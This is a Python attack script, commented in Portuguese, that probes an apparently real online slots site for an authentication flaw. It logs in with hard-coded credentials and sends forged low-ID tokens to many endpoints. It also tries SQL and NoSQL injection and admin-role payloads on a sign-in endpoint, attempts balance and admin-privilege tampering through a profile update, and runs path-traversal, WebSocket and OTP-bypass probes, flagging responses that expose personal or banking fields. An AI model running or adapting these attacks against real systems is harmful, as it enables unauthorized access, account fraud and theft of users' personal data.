"""
caca_falha_secreta.py — Busca a "falha central" indicada pelo professor.

Estratégia:
1. Testa todos os endpoints novos descobertos no bundle JS
2. Testa token anão em todos eles
3. Tenta sign-in v2 (endpoint alternativo de login)
4. Testa WebSocket sem auth
5. Testa sign-in com payloads especiais (admin bypass)
6. Testa prod-api/set/mains (nunca testado)
7. Tenta path traversal nos endpoints conhecidos
8. Testa /prod-api/player/update com delay zero (TTL issue fix)
"""
from __future__ import annotations
import urllib.request, urllib.error, ssl, json, time
from datetime import datetime, timezone

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

BASE  = "https://ds.amizade777.com"
PKG   = "com.slots.big"
PHONE = "21998498419"
PWD   = "21998498419"
DID   = "0beb614f-8838-43ef-00fc-0029f7d5d20f"

RESULTS = []
SEV = {"critical":"🔴","high":"🟠","medium":"🟡","low":"🔵","info":"⚪"}

def _req(method, url, headers=None, body=None, timeout=10):
    h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json, */*",
         "Origin": BASE, "Referer": BASE + "/"}
    if body is not None:
        h["Content-Type"] = "application/json"
    if headers:
        h.update(headers)
    data = json.dumps(body).encode() if body is not None else None
    try:
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=timeout, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read(16384).decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        try:
            return e.code, dict(e.headers or {}), e.read(8192).decode("utf-8","ignore")
        except Exception:
            return e.code, {}, ""
    except Exception as ex:
        return 0, {}, f"<EXC {type(ex).__name__}: {ex}>"

def get(path, token=None, host=None):
    h = {}
    if token is not None:
        h["Token"] = str(token)
    base = f"https://{host}" if host else BASE
    st, _, raw = _req("GET", base + path, h)
    try: return st, json.loads(raw)
    except: return st, {"_raw": raw[:400]}

def post(path, body, token=None, host=None):
    h = {}
    if token is not None:
        h["Token"] = str(token)
    base = f"https://{host}" if host else BASE
    st, _, raw = _req("POST", base + path, h, body)
    try: return st, json.loads(raw)
    except: return st, {"_raw": raw[:400]}

def login():
    payload = {
        "appChannel":"pc","appPackageName":PKG,"deviceId":DID,
        "deviceModel":"WEB","deviceVersion":"WEB","appVersion":"1.0.0",
        "sysTimezone":None,"sysLanguage":None,
        "phone":PHONE,"password":PWD,
    }
    st, body = post("/prod-api/player/sign-in", payload)
    if body.get("code") != 200:
        raise RuntimeError(f"Login falhou: {body.get('msg')}")
    return body["data"]["token"], body["data"]["user_info"]

def rec(cat, test, req, resp, interp, sev="info"):
    e = {"ts": datetime.now(timezone.utc).isoformat(),
         "category": cat, "test": test,
         "request": req, "response": resp,
         "interpretation": interp, "severity": sev}
    RESULTS.append(e)
    code = resp.get("code","?") if isinstance(resp,dict) else "?"
    msg  = str(resp.get("msg",""))[:50] if isinstance(resp,dict) else ""
    print(f"  {SEV.get(sev,'⚪')} [{cat}/{test[:55]}] code={code} msg={msg!r}")
    if sev in ("critical","high"):
        print(f"     ↪ {interp}")

# ═══════════════════════════════════════════════════════════════════
# 1. Todos os novos endpoints do bundle
# ═══════════════════════════════════════════════════════════════════

NEW_ENDPOINTS = [
    # token anão E token válido em ambos os métodos
    ("GET",  "/japi/user/getExtraInfo"),
    ("POST", "/japi/user/getExtraInfo"),
    ("GET",  "/japi/user/getDama"),
    ("POST", "/japi/user/getDama"),
    ("POST", "/prod-api/set/mains"),
    ("GET",  "/prod-api/set/mains"),
    ("POST", "/japi/user/api/signIn/signRecord"),
    ("POST", "/japi/user/api/signIn/v2/signIn"),
    ("GET",  "/japi/user/api/signIn/customerSignConfig"),
    ("POST", "/japi/user/vip/getAllDisplayVo"),
    ("GET",  "/japi/user/vip/getAllDisplayVo"),
    ("POST", "/prod-api/vip/info"),
    ("GET",  "/prod-api/vip/info"),
    ("POST", "/prod-api/otp/ping"),
    ("POST", "/prod-api/letters/list"),
    ("POST", "/prod-api/mail/getMailCount"),
    ("POST", "/prod-api/playGame/queryUserGameRecord"),
    ("POST", "/japi/invite/boxConfig/boxInfo"),
    ("POST", "/japi/invite/boxConfig/boxReceive"),
    ("GET",  "/japi/invite/boxConfig/boxReceiveRecord"),
    ("POST", "/japi/invite/userInvite/getInviteConfig"),
    ("POST", "/japi/invite/userInvite/getFirstRechargeRewardRecord"),
    ("POST", "/japi/invite/userInvite/queryInviteRewardData"),
    ("POST", "/japi/invite/userInvite/queryUnsettleInviteRewardData"),
    ("POST", "/japi/invite/userInvite/queryInviteDayReportData"),
    ("POST", "/japi/activity/redPacketRain/currentRedPacketRainActivityList"),
    ("POST", "/japi/activity/redPacketRain/getRedPacket"),
    ("POST", "/japi/activity/redPacketRain/getReward"),
    ("GET",  "/prod-api/pay-service/bank"),
    ("POST", "/prod-api/pay-service/bank"),
    ("GET",  "/prod-api/pay-service/recharge-list"),
    ("GET",  "/prod-api/pay-service/withdraw-limit"),
    ("GET",  "/prod-api/payment/balance-less/list"),
    ("POST", "/prod-api/notice/list"),
    ("GET",  "/prod-api/notice/list"),
    ("POST", "/japi/user/game/getGameList"),
    ("POST", "/prod-api/global-config/recharge"),
    ("GET",  "/prod-api/global-config/recharge"),
]

def block_new_endpoints():
    print("\n" + "="*60)
    print("BLOCO 1 — NOVOS ENDPOINTS DO BUNDLE")
    print("="*60)

    try:
        token_valid, _ = login()
        print(f"  Token válido: {token_valid}")
    except Exception as ex:
        print(f"  Login falhou: {ex}")
        token_valid = None

    time.sleep(0.5)

    body_default = {"appPackageName": PKG, "appVersion": "1.0.0",
                    "appChannel": "pc"}

    for method, path in NEW_ENDPOINTS:
        # Teste 1: token anão (uid=1)
        if method == "GET":
            st1, b1 = get(path, token=1)
        else:
            st1, b1 = post(path, body_default, token=1)

        c1 = b1.get("code") if isinstance(b1, dict) else None
        d1 = b1.get("data") if isinstance(b1, dict) else None

        # Teste 2: sem token
        if method == "GET":
            st0, b0 = get(path)
        else:
            st0, b0 = post(path, body_default)
        c0 = b0.get("code") if isinstance(b0, dict) else None

        # Teste 3: token válido (se disponível)
        bv = None
        if token_valid:
            if method == "GET":
                stv, bv = get(path, token=token_valid)
            else:
                stv, bv = post(path, body_default, token=token_valid)
            cv = bv.get("code") if isinstance(bv, dict) else None
        else:
            cv = None

        # Análise
        sev = "info"
        interp_parts = []

        # Endpoint existe (não é 404/405)?
        endpoint_exists = c1 is not None or st1 not in (404, 405, 0)
        if not endpoint_exists and c0 is None and cv is None:
            continue  # 404 em todos — não interessa

        # Token anão aceito?
        if c1 == 200:
            dk = list(d1.keys()) if isinstance(d1, dict) else None
            interp_parts.append(f"Token anão aceito! data_keys={dk}")
            sev = "critical" if dk else "high"

        # Endpoint público (sem token)?
        if c0 == 200:
            interp_parts.append("Endpoint público (sem auth)!")
            sev = max(sev, "high", key=lambda x: ["info","low","medium","high","critical"].index(x))

        # Token válido retornou dados sensíveis?
        if cv == 200 and bv:
            dv = bv.get("data")
            if isinstance(dv, dict):
                sensitive = [k for k in dv
                             if any(s in k.lower() for s in
                                    ("phone","email","cpf","bank","real_name",
                                     "ip","client_ip","password","id_number",
                                     "account","admin","role","permission"))]
                if sensitive:
                    interp_parts.append(f"Dados sensíveis com token válido: {sensitive}")
                    if sev == "info": sev = "medium"

        if interp_parts or c1 == 200 or c0 == 200:
            rec("new_endpoint", f"{method} {path}",
                {"method": method, "path": path,
                 "tokens": {"anao": 1, "sem": "none", "valido": "..."}},
                {"code_anao": c1, "code_sem_token": c0, "code_valido": cv,
                 "data_keys_anao": list(d1.keys()) if isinstance(d1,dict) and d1 else None,
                 "data_keys_valido": (list(bv["data"].keys()) if bv and isinstance(bv.get("data"),dict) else None),
                 "sample_anao": json.dumps(d1, ensure_ascii=False)[:300] if d1 else None},
                " | ".join(interp_parts) if interp_parts else f"Endpoint existe. codes={c1}/{c0}/{cv}",
                sev)
        time.sleep(0.8)

# ═══════════════════════════════════════════════════════════════════
# 2. Sign-in v2 — possível bypass de autenticação
# ═══════════════════════════════════════════════════════════════════

def block_signin_v2():
    print("\n" + "="*60)
    print("BLOCO 2 — SIGN-IN V2 + PAYLOADS ESPECIAIS")
    print("="*60)

    base_payload = {
        "appChannel":"pc","appPackageName":PKG,"deviceId":DID,
        "deviceModel":"WEB","deviceVersion":"WEB","appVersion":"1.0.0",
        "sysTimezone":None,"sysLanguage":None,
    }

    # v2 do signIn
    v2_payloads = [
        ("v2 normal",
            dict(base_payload, phone=PHONE, password=PWD)),
        ("v2 admin bypass — role admin",
            dict(base_payload, phone=PHONE, password=PWD,
                 role="admin", isAdmin=True)),
        ("v2 empty phone",
            dict(base_payload, phone="", password="")),
        ("v2 null phone",
            dict(base_payload, phone=None, password=None)),
        ("v2 sql injection phone",
            dict(base_payload, phone="' OR '1'='1", password="any")),
        ("v2 nosql injection",
            dict(base_payload, phone={"$ne": ""}, password={"$ne": ""})),
        ("v2 phone=admin",
            dict(base_payload, phone="admin", password="admin")),
    ]

    for label, payload in v2_payloads:
        st, body = post("/japi/user/api/signIn/v2/signIn", payload)
        code = body.get("code") if isinstance(body, dict) else None
        data = body.get("data") if isinstance(body, dict) else None

        is_interesting = (code == 200 and data is not None) or code not in (None, 102001, 102002, 102003, 102004, 102005, 102006, 102007, 102008, 102009, 400, 401, 403, 404, 405)
        if is_interesting:
            rec("signin_v2", label,
                {"path": "/japi/user/api/signIn/v2/signIn", "payload_keys": list(payload.keys())},
                {"code": code, "msg": body.get("msg") if isinstance(body,dict) else str(body)[:100],
                 "has_token": bool(data and "token" in str(data))},
                f"Resposta incomum! code={code}",
                "critical" if (code == 200 and data and "token" in str(data)) else "high")
        else:
            rec("signin_v2", label,
                {"path": "/japi/user/api/signIn/v2/signIn"},
                {"code": code, "msg": body.get("msg","")[:50] if isinstance(body,dict) else ""},
                "Rejeitado normalmente.", "info")
        time.sleep(0.5)

# ═══════════════════════════════════════════════════════════════════
# 3. Player/update IMEDIATAMENTE após login (TTL fix)
# ═══════════════════════════════════════════════════════════════════

def block_player_update_immediate():
    print("\n" + "="*60)
    print("BLOCO 3 — PLAYER/UPDATE IMEDIATO (resolve TTL)")
    print("="*60)

    # Para cada payload, faz login e IMEDIATAMENTE manda o update
    # sem nenhum sleep entre eles
    payloads_to_test = [
        ("nickname_only", {"nickname": f"G{137027}"}),
        ("balance",       {"nickname": f"G{137027}", "balance": 999999}),
        ("vipLevel",      {"nickname": f"G{137027}", "vipLevel": 99}),
        ("isAdmin",       {"nickname": f"G{137027}", "isAdmin": True}),
        ("role_admin",    {"nickname": f"G{137027}", "role": "admin"}),
    ]

    for label, payload in payloads_to_test:
        try:
            token, _ = login()
            # IMEDIATO — zero sleep
            st, body = post("/prod-api/player/update", payload, token)
            code = body.get("code") if isinstance(body, dict) else None
            msg  = body.get("msg","") if isinstance(body, dict) else str(body)[:100]
            sev  = "info"
            interp = f"code={code} msg={msg!r}"
            if code == 200 and label != "nickname_only":
                interp += " — UPDATE PRIVILEGIADO ACEITO!"
                sev = "critical"
            elif code == 200:
                interp += " — Update normal OK (baseline)."
            rec("player_update", label,
                {"path": "/prod-api/player/update", "payload": payload},
                {"code": code, "msg": str(msg)[:80]},
                interp, sev)
        except Exception as ex:
            rec("player_update", label, {}, {"err": str(ex)}, str(ex), "info")
        time.sleep(0.5)

# ═══════════════════════════════════════════════════════════════════
# 4. Path traversal nos endpoints existentes
# ═══════════════════════════════════════════════════════════════════

def block_path_traversal():
    print("\n" + "="*60)
    print("BLOCO 4 — PATH TRAVERSAL")
    print("="*60)

    try:
        token, _ = login()
    except Exception as ex:
        print(f"  Login falhou: {ex}")
        return

    traversals = [
        "/prod-api/player/../admin/player/list",
        "/prod-api/player/..%2Fadmin%2Fplayer%2Flist",
        "/prod-api/player/%2e%2e/admin/player/list",
        "/japi/user/..%2fadmin%2flist",
        "/japi/user/%2e%2e%2fadmin%2flist",
        "/prod-api/set/..%2fadmin%2fconfig",
        "/prod-api/pay-service/..%2fadmin%2frecharge%2flist",
    ]
    for path in traversals:
        st, body = get(path, token=token)
        code = body.get("code") if isinstance(body, dict) else None
        data = body.get("data") if isinstance(body, dict) else None
        if code == 200 and data:
            rec("path_traversal", path,
                {"path": path},
                {"code": code, "data_keys": list(data.keys()) if isinstance(data,dict) else None},
                "PATH TRAVERSAL CONFIRMADO!", "critical")
        time.sleep(0.5)

# ═══════════════════════════════════════════════════════════════════
# 5. WebSocket — tenta conectar sem token
# ═══════════════════════════════════════════════════════════════════

def block_websocket():
    print("\n" + "="*60)
    print("BLOCO 5 — WEBSOCKET SEM AUTH (HTTP upgrade probe)")
    print("="*60)

    # Não vamos fazer WS real (precisaria de asyncio + websockets).
    # Mas podemos fazer um probe HTTP que testa se o endpoint de WS
    # retorna informações úteis com GET comum.
    ws_paths = [
        "/websocket6",
        "/ws",
        "/websocket",
        "/socket",
        "/socket.io/",
        "/sockjs/",
        "/japi/ws",
        "/prod-api/ws",
    ]
    for path in ws_paths:
        st, hdrs, raw = _req("GET", BASE + path,
                             {"Upgrade": "websocket",
                              "Connection": "Upgrade",
                              "Sec-WebSocket-Version": "13",
                              "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ=="})
        is_ws = st == 101 or "websocket" in str(hdrs.get("Upgrade","")).lower()
        is_interesting = st in (101, 200, 302) or is_ws
        if is_interesting:
            rec("websocket", path,
                {"path": path, "upgrade": True},
                {"http": st, "is_websocket": is_ws,
                 "headers": {k:v for k,v in hdrs.items()
                             if k.lower() in ("upgrade","connection","sec-websocket-accept")}},
                "WebSocket endpoint respondeu!" + (" 101 Upgrade!" if st==101 else ""),
                "high" if st == 101 else "medium")
        time.sleep(0.5)

# ═══════════════════════════════════════════════════════════════════
# 6. OTP/captcha — possível bypass
# ═══════════════════════════════════════════════════════════════════

def block_otp():
    print("\n" + "="*60)
    print("BLOCO 6 — OTP / CAPTCHA BYPASS")
    print("="*60)

    # ping do OTP sem token
    st, body = post("/prod-api/otp/ping", {"phone": PHONE})
    rec("otp", "POST /prod-api/otp/ping (sem token)",
        {"phone": PHONE},
        {"code": body.get("code") if isinstance(body,dict) else None,
         "msg": body.get("msg","")[:80] if isinstance(body,dict) else str(body)[:100]},
        "Resposta do ping OTP sem auth.",
        "medium" if body.get("code") == 200 else "info")
    time.sleep(0.5)

    # captcha image
    st, body = get("/japi/user/captcha/image")
    rec("captcha", "GET /japi/user/captcha/image (sem token)",
        {"path": "/japi/user/captcha/image"},
        {"code": body.get("code") if isinstance(body,dict) else None,
         "has_data": bool(body.get("data")) if isinstance(body,dict) else False},
        "Endpoint de captcha sem auth — verifica se retorna info útil.",
        "medium" if body.get("code") == 200 else "info")

# ═══════════════════════════════════════════════════════════════════
# 7. /japi/user/getExtraInfo — suspeito pelo nome
# ═══════════════════════════════════════════════════════════════════

def block_extra_info():
    print("\n" + "="*60)
    print("BLOCO 7 — getExtraInfo (endpoint suspeito)")
    print("="*60)

    try:
        token, _ = login()
    except Exception as ex:
        print(f"  Login falhou: {ex}")
        return

    for tok_label, tok in [
        ("token_valido", token),
        ("token_anao_1", "1"),
        ("token_anao_137027", "137027"),
        ("sem_token", None),
    ]:
        for method in ("GET", "POST"):
            if method == "GET":
                st, body = get("/japi/user/getExtraInfo", token=tok)
            else:
                st, body = post("/japi/user/getExtraInfo",
                                {"appPackageName": PKG}, token=tok)
            code = body.get("code") if isinstance(body,dict) else None
            data = body.get("data") if isinstance(body,dict) else None

            if code == 200:
                rec("getExtraInfo", f"{method} {tok_label}",
                    {"method": method, "token_type": tok_label},
                    {"code": code,
                     "data_keys": list(data.keys()) if isinstance(data,dict) else str(data)[:100],
                     "data": json.dumps(data, ensure_ascii=False)[:400] if data else None},
                    "Retornou dados! Verificar conteúdo.",
                    "critical" if tok_label.startswith("token_anao") else "high")
            time.sleep(0.5)

# ═══════════════════════════════════════════════════════════════════
# dump
# ═══════════════════════════════════════════════════════════════════

def dump():
    sev_order = {"critical":0,"high":1,"medium":2,"low":3,"info":4}
    with open("caca_falha_secreta_resultados.json","w",encoding="utf-8") as f:
        json.dump(RESULTS, f, ensure_ascii=False, indent=2, default=str)

    with open("caca_falha_secreta_resultados.md","w",encoding="utf-8") as f:
        f.write("# Resultados — caca_falha_secreta.py\n\n")
        f.write(f"_{datetime.now().isoformat()}_\n\n")
        from collections import Counter
        c = Counter(e["severity"] for e in RESULTS)
        for sev in ("critical","high","medium","low","info"):
            f.write(f"- {SEV.get(sev,'')} {sev}: {c.get(sev,0)}\n")
        f.write("\n---\n\n")
        for e in sorted(RESULTS, key=lambda x: sev_order.get(x["severity"],99)):
            if e["severity"] == "info":
                continue
            f.write(f"### [{e['severity'].upper()}] {e['category']} — {e['test']}\n\n")
            f.write(f"**Interpretação:** {e['interpretation']}\n\n")
            f.write("```json\nReq: ")
            f.write(json.dumps(e["request"], ensure_ascii=False, default=str))
            f.write("\nResp: ")
            f.write(json.dumps(e["response"], ensure_ascii=False, default=str))
            f.write("\n```\n\n---\n\n")

    print(f"\n✅ caca_falha_secreta_resultados.json / .md")
    non_info = [e for e in RESULTS if e["severity"] != "info"]
    print(f"   {len(non_info)} achados não-info de {len(RESULTS)} total")

def main():
    for name, fn in [
        ("new_endpoints",    block_new_endpoints),
        ("signin_v2",        block_signin_v2),
        ("player_update",    block_player_update_immediate),
        ("path_traversal",   block_path_traversal),
        ("websocket",        block_websocket),
        ("otp",              block_otp),
        ("getExtraInfo",     block_extra_info),
    ]:
        try:
            fn()
        except Exception as ex:
            print(f"[ERRO {name}]: {type(ex).__name__}: {ex}")
        time.sleep(1)
    dump()

if __name__ == "__main__":
    main()
